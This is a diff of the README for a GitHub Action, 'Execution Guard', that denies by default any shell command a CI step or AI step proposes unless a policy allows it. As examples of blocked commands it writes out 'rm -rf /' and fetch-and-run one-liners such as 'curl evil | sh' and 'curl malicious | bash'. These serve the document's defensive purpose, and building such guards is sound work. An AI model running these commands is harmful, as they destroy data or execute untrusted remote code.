@@ -1,226 +1,126 @@
 # Execution Guard Action
 
-Execution Guard is a deny-by-default execution layer for GitHub Actions built on Execution Boundary architecture.
-
-[![Demo](https://github.com/Nick-heo-eg/execution-guard-action/actions/workflows/demo.yml/badge.svg)](https://github.com/Nick-heo-eg/execution-guard-action/actions/workflows/demo.yml)
+This GitHub Action blocks any shell command that is not explicitly allowed by policy (default = DENY).
 
 ---
 
-## 30-Second Demo
-
-Three scenarios. Run them yourself.
-
-### Scenario 1: curl blocked (STOP)
+## 60-Second Setup
 
 ```yaml
 - uses: Nick-heo-eg/execution-guard-action@v0.1.0
   with:
-    command: 'curl https://example.com'
-    policy_path: './policies/safe-commands.yaml'
+    policy_path: policy.yaml
 ```
 
-```
-DECISION: STOP
-PROPOSAL_HASH: a3f2c1...
-REASON: No rule matched. Default: DENY
-❌ EXECUTION BLOCKED (STOP)
-```
+Add this step before any shell execution. If it doesn't match policy, it will not run.
 
-### Scenario 2: rm -rf / blocked (STOP)
+---
+
+## Minimal Policy Example
 
 ```yaml
-- uses: Nick-heo-eg/execution-guard-action@v0.1.0
-  with:
-    command: 'rm -rf /'
-    policy_path: './policies/safe-commands.yaml'
-```
+# policy.yaml
+default: DENY
 
-```
-DECISION: STOP
-PROPOSAL_HASH: 8b4e91...
-REASON: No rule matched. Default: DENY
-❌ EXECUTION BLOCKED (STOP)
-```
-
-### Scenario 3: echo allowed (ALLOW)
-
-```yaml
-- uses: Nick-heo-eg/execution-guard-action@v0.1.0
-  with:
-    command: 'echo hello'
-    policy_path: './policies/safe-commands.yaml'
-```
-
-```
-DECISION: ALLOW
-PROPOSAL_HASH: 7d2f44...
-REASON: Policy match: command="echo" scope="safe-commands"
-✅ Execution permitted: echo hello
-hello
+rules:
+  - command: echo
+    args: ['*']
+    scope: safe
 ```
 
 ---
 
-## Architecture
+## Real-World Example
 
-```
-GitHub Actions Workflow
-         │
-         ▼
-  ┌──────────────────────────┐
-  │   AI Step / CI Step      │  ← generates command
-  │   command: "rm -rf /"    │
-  └──────────┬───────────────┘
-             │  INPUT_COMMAND
-             ▼
-  ┌──────────────────────────┐
-  │   Execution Guard        │  ← this action
-  │   (Adapter Layer)        │
-  │                          │
-  │  reads: INPUT_COMMAND    │
-  │         POLICY_PATH      │
-  └──────────┬───────────────┘
-             │
-             ▼
-  ┌──────────────────────────┐
-  │   Execution Boundary     │  ← sealed core engine
-  │   (execution-runtime-    │    core invariant hash:
-  │    core, SEALED)         │    54add9db6f88f28a8...
-  │                          │
-  │  evaluate(request)       │
-  │  → verdict: ALLOW|DENY   │
-  └──────────┬───────────────┘
-             │
-             ▼
-  ┌──────────────────────────┐
-  │   Verdict                │
-  │   ALLOW → spawn()        │  ← command executes
-  │   STOP  → exit(1)        │  ← job fails, blocked
-  │   HOLD  → warn/exit(1)   │  ← soft gate (future)
-  └──────────────────────────┘
-```
+If an AI-generated PR tries to run `rm -rf /` or `curl malicious | bash`, this step blocks it before execution.
+
+No changes to your workflow logic. Just add the step, define what's allowed.
 
 ---
 
-## Usage
+## Quick Demo
 
-### Basic
-
-```yaml
-steps:
-  - uses: actions/checkout@v4
-
-  - name: Guard command execution
-    uses: Nick-heo-eg/execution-guard-action@v0.1.0
-    with:
-      command: 'echo deploy complete'
-      policy_path: './policy.yaml'
+```
+echo hello      →  DECISION: ALLOW  (exits 0, command runs)
+rm -rf /        →  DECISION: STOP   (exits 1, command never runs)
+curl evil | sh  →  DECISION: STOP   (exits 1, command never runs)
 ```
 
-### With fail_on_hold
+Deterministic. Exact match only. No semantic parsing.
 
-```yaml
-- uses: Nick-heo-eg/execution-guard-action@v0.1.0
-  with:
-    command: 'npm run build'
-    policy_path: './policy.yaml'
-    fail_on_hold: 'false'   # warn on HOLD, don't fail
-```
-
-### Capture outputs
-
-```yaml
-- name: Guard
-  id: guard
-  uses: Nick-heo-eg/execution-guard-action@v0.1.0
-  with:
-    command: 'deploy.sh'
-    policy_path: './policy.yaml'
-
-- name: Audit log
-  run: |
-    echo "Verdict: ${{ steps.guard.outputs.verdict }}"
-    echo "Hash:    ${{ steps.guard.outputs.proposal_hash }}"
-    echo "Reason:  ${{ steps.guard.outputs.reason }}"
-```
+Audit: Each blocked command is logged with a proposal hash.
 
 ---
 
 ## Inputs
 
-| Input | Required | Default | Description |
-|-------|----------|---------|-------------|
-| `command` | yes | — | Command string to evaluate and execute |
-| `policy_path` | no | `./policy.yaml` | Path to policy YAML file |
-| `fail_on_hold` | no | `true` | Exit 1 on HOLD verdict (false = warn + exit 0) |
+| Input | Default | Description |
+|-------|---------|-------------|
+| `command` | required | Command string to evaluate |
+| `policy_path` | `./policy.yaml` | Path to your policy YAML |
+| `fail_on_hold` | `true` | Exit 1 on HOLD verdict |
 
 ## Outputs
 
 | Output | Description |
 |--------|-------------|
 | `verdict` | `ALLOW`, `STOP`, or `HOLD` |
-| `proposal_hash` | SHA256 hash of execution proposal (audit trail) |
-| `reason` | Human-readable verdict reason |
+| `proposal_hash` | SHA256 of execution proposal |
+| `reason` | Why the verdict was issued |
 
 ---
 
-## Policy Format
+**If you run AI-generated commands in CI, try this before your shell step.**
 
-```yaml
-default: DENY
+---
 
-rules:
-  - command: echo
-    args: ['*']
-    scope: safe-commands
+## Advanced / Design Notes
 
-  - command: ls
-    args: ['*']
-    scope: safe-commands
+<details>
+<summary>Architecture, invariant hash, and design rationale</summary>
+
+### How it works
+
+```
+AI Step / CI Step
+      │ command: "rm -rf /"
+      ▼
+Execution Guard  ← this action
+      │ reads policy_path
+      ▼
+Execution Boundary Core  ← sealed engine
+      │ evaluate(command, args)
+      ▼
+Verdict: ALLOW → spawn()  |  STOP → exit(1)
 ```
 
-**Guarantee**: No match → DENY. Malformed policy → DENY. No policy → DENY.
+### Verdict model
 
-See [`policies/`](./policies/) for examples.
+| Verdict | Behavior |
+|---------|----------|
+| ALLOW | Command spawned, exits with command's exit code |
+| STOP | Execution blocked, exits 1 |
+| HOLD | Soft gate — fail_on_hold controls exit code |
 
----
+### Core invariant
 
-## Verdict Reference
+Built on a sealed Execution Boundary core. Core is **UNTOUCHED** by this adapter.
 
-| Verdict | Meaning | Exit Code |
-|---------|---------|-----------|
-| `ALLOW` | Policy match — command spawned | 0 (or command's exit code) |
-| `STOP` | No match or no policy — execution blocked | 1 |
-| `HOLD` | Soft gate (future) — fail_on_hold controls behavior | 0 or 1 |
+Core invariant hash: `54add9db6f88f28a81bbfd428d47fa011ad9151b91df672c3c1fa75beac32f04`
 
----
+Verify: `bash scripts/verify-invariant.sh` in `execution-runtime-core`.
 
-## Core Boundary
+### Guarantee
 
-This action is an adapter over the sealed **Execution Boundary** core engine.
+- No policy → DENY
+- Malformed policy → DENY
+- Command not in policy → DENY
+- Exact match only → ALLOW
 
-**Core is UNTOUCHED.** No core code modified in this adapter.
+### Roadmap
 
-**Core invariant hash**: `54add9db6f88f28a81bbfd428d47fa011ad9151b91df672c3c1fa75beac32f04`
+- [ ] HOLD verdict via policy `action: hold`
+- [ ] Multi-command evaluation
+- [ ] OpenTelemetry span export (optional, future only)
 
-The core engine enforces:
-- Default = DENY (no policy → no execution)
-- Exact string match only (no semantic evaluation)
-- Deterministic (same input → same decision)
-- Fail-closed (all errors → DENY)
-- Cryptographic audit (SHA256 proposal hash on every attempt)
-
----
-
-## Roadmap
-
-- [x] v0.1.0 — GitHub Actions adapter (ALLOW/STOP/HOLD)
-- [ ] v0.2.0 — HOLD verdict via policy `action: hold`
-- [ ] v0.3.0 — Multi-command policy evaluation
-- [ ] v1.0.0 — OpenTelemetry span export (optional, roadmap only)
-
----
-
-## License
-
-MIT
+</details>
